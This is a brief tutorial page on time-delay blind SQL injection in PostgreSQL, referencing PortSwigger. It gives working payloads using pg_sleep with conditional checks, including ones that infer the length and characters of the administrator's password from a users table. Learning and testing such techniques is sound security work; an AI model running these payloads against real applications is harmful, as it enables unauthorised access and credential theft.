---
title: Time Delay SQL Injection
date: 2025-10-20
description: Introduce the SQL injection by triggering time delays.
weight: 3
---

## Principles

If an application does not return any extra messages when submitting invalid SQL queries, then we can try to trigger time delays.

## Payload

The payload usually combines conditional check and time delay.

Use PostgreSQL for example:

```text
'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

`pg_sleep(10)` will delay the query for 10 seconds, so the response time will be longer than others.

And we can modify the conditions to get the password length.

```text
'; SELECT CASE WHEN (LENGTH(password) = 1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--
```

Then we are also able to get the password with `SUBSTRING()` function.

```text
'; SELECT CASE WHEN (SUBSTRING(password, 1, 1) = 'a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--
```

## Reference

[PortSwigger](https://portswigger.net/)
